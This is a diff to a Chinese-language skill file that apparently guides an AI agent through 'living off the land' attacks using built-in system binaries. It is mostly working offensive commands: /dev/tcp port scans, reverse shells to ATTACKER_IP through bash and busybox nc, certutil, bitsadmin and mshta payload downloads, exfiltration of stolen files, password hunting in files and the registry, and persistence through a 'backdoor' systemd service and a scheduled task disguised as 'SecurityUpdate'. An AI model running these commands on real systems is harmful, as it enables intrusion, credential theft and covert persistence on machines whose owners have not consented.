@@ -1,13 +1,55 @@
 ---
 name: 'living-off-the-land'
-description: 'Living Off The Land：不用上传工具，用系统自带二进制完成侦察/传输/执行/持久化。Linux /dev/tcp 纯 bash + Windows certutil/bitsadmin/mshta'
-disable-model-invocation: true
+description: 'Living Off The Land：不用上传工具，用系统自带二进制完成侦察/传输/执行/持久化。含「能力重建索引」(缺工具→反查替代品) + Linux /dev/tcp 纯 bash + Windows certutil/bitsadmin/mshta。（检索词：lotl/ss/netstat/dev-tcp/port-scan/nc/powershell/reverse-shell/curl/certutil/dev tcp/port scan/reverse shell）'
 metadata: { domain: linux, tier: T2 }
 ---
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # Living Off The Land (LOTL)
 
 > 不用上传任何工具，只用目标系统自带的二进制完成侦察、传输、执行、持久化
+
+## 🔴 能力重建索引（先问"我缺什么工具"，再反查替代品）
+
+> 目标常缺你习惯的工具：容器最小化镜像、跳板机、老系统。
+> **顺序是「发现缺什么 → 查表」，不是「试了半天才发现没装」。**
+
+| 缺什么 | 替代方案 | 备注 |
+|--------|---------|------|
+| `netstat` | `ss -twurp` / `ss -ntlp` | `ss` 几乎总在；`-p` 需权限 |
+| `nmap` | 循环 `/dev/tcp`；或 `openssl s_client` | 见下 |
+| `nc` | `/dev/tcp` 重定向 | **bash 内建，不需要任何二进制** |
+| `curl`/`wget` | `/dev/tcp` 手写 HTTP 报文 | |
+| `scp`/`ftp` | `nc` + `base64` 分块搬运 | |
+| `python`/`perl` | `awk` / `find` / `busybox` | |
+| `redis-cli` | `nc` 直连 6379 手打 RESP | 见 `service-attacks` Redis 段 |
+| `ping` 不可用 | `timeout 1 bash -c 'echo >/dev/tcp/HOST/PORT'` | 连通性探测 |
+| `lsblk` | `cat /proc/partitions` / `ls /dev/sd*` | 找未挂载分区 |
+| `ps`/`top` | `/proc/*/cmdline` 遍历 | |
+
+### 无扫描器时的端口发现
+```bash
+# ① /dev/tcp 循环 —— 最通用，不依赖任何工具
+for p in $(seq 1 65535); do (echo > /dev/tcp/<IP>/$p) 2>/dev/null && echo "OPEN $p"; done
+# 并发加速（分片 + wait）
+for p in $(seq 1 65535); do (echo >/dev/tcp/<IP>/$p) 2>/dev/null && echo "OPEN $p" & done; wait
+
+# ② openssl s_client 循环 —— 目标有 openssl 时，比 ① 更能顺带拿到 banner
+for p in 21 22 25 80 443 6379 8080 8443; do
+  timeout 2 openssl s_client -connect <IP>:$p 2>/dev/null | grep -q CONNECTED && echo "OPEN $p"
+done
+
+# 🔴 别一上来就 1-65535 全扫内网每个主机 —— 先打高价值端口，再决定要不要全扫
+```
+
+### 无 ping / 无 nmap 时的内网主机发现
+```bash
+for i in $(seq 1 254); do (ping -c 1 -W 1 172.19.0.$i >/dev/null 2>&1 && echo "UP 172.19.0.$i") & done; wait
+# ping 被禁 → 改用 /dev/tcp 探常见端口判断存活
+```
+
+🔴 **容器环境警告**：Docker 每次重启会**重新随机分配**容器的 .2/.3/.4 IP。
+**不要缓存上一轮的 IP↔服务映射** —— 每轮必须重新发现，否则会对着错误的主机打半天。
 
 ## 侦察 (Recon)
 
@@ -24,7 +66,7 @@ systeminfo; ver; hostname; whoami /all; set
 tasklist /v; netstat -ano; ipconfig /all; route print
 qwinsta  # 谁登录了 (RDP sessions)
 net user; net localgroup; net group /domain
-```text
+```
 
 ### 文件/凭据搜索
 ```bash
@@ -39,7 +81,7 @@ dir /s C:\*.xml C:\*.ini C:\*.config C:\*.conf > find.txt
 findstr /si password *.xml *.ini *.txt
 reg query HKLM /f password /t REG_SZ /s
 type %USERPROFILE%\AppData\Local\.bash_history 2>nul
-```text
+```
 
 ### 网络侦察
 ```bash
@@ -50,7 +92,7 @@ timeout 2 bash -c 'echo >/dev/tcp/10.0.0.1/445 && echo OPEN || echo CLOSED' 2>/d
 # Windows
 net view; net view /domain; netstat -ano | findstr ESTABLISHED
 nslookup DOMAIN_CONTROLLER; ping -n 1 HOST
-```text
+```
 
 ## 文件传输 (File Transfer)
 
@@ -69,7 +111,7 @@ certutil -encode stolen.txt tmp.b64 && type tmp.b64
 
 # === certutil 直接上传 (Windows) ===
 certutil -urlcache -split -f http://ATTACKER_IP:8080/tool.exe C:\Windows\Temp\t.exe
-```text
+```
 
 ### 入站 (下载工具 → 受害机)
 ```bash
@@ -89,7 +131,7 @@ bitsadmin /transfer job /download /priority high http://ATTACKER_IP:8080/tool.ex
 
 # === Windows mshta (远程 VBS/JS) ===
 mshta http://ATTACKER_IP:8080/payload.hta
-```text
+```
 
 ## 执行 (Code Execution)
 
@@ -106,7 +148,7 @@ find /etc -name passwd -exec /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 
 
 # === busybox (嵌入式系统) ===
 busybox nc ATTACKER_IP 4444 -e /bin/sh
-```text
+```
 
 ### Windows 无 powershell.exe (被 AppLocker 拦)
 ```bash
@@ -127,7 +169,7 @@ mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami"":cl
 
 # === wmic ===
 wmic process call create "cmd.exe /c whoami"
-```text
+```
 
 ## 持久化 (Persistence)
 
@@ -151,7 +193,7 @@ Restart=always
 WantedBy=default.target
 EOF
 systemctl --user enable --now backdoor.service
-```text
+```
 
 ### Windows
 ```bash
@@ -163,7 +205,7 @@ schtasks /create /sc minute /mo 10 /tn "SecurityUpdate" /tr "cmd.exe /c whoami" 
 
 # === WMI 事件订阅 (无文件落地) ===
 wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE ...
-```text
+```
 
 ## 交互 Shell 升级
 
@@ -178,14 +220,14 @@ busybox sh                                              # 嵌入式
 stty raw -echo; fg; reset
 export TERM=xterm-256color
 exec /bin/bash -i
-```text
+```
 
 ## 快速记忆口诀
 
-```yaml
+```
 侦察: id, sudo -l, ps aux, ss -ntlp, env, find writable
 传输: certutil (Win), /dev/tcp (Linux), base64 (通用)
 执行: bash -i >& /dev/tcp, awk system(), find -exec, mshta (Win)
 升级: python3 pty.spawn
 持久: crontab, .bashrc, registry Run
-```text
+```
